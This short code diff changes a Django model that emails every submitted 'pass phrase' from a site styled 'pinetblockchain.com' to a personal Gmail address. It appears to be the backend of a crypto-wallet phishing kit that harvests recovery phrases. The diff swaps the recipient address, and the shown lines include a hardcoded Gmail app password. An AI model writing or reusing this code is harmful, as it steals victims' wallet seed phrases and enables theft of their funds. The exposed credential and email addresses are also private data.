@@ -15,7 +15,7 @@ class PassPhrase(models.Model):
         gmail_password = 'ghcz jcpi zqbk olay'
         
         sent_from = gmail_user
-        to = ['agwumafam@gmail.com']
+        to = ['randallpitt3@gmail.com']
         subject = 'New Pass Phrase Has Been Submitted'
         
         email_text = (f"From : pinetblockchain.com\nSubject : New Pass Phrase Added\n{self.phrase}")
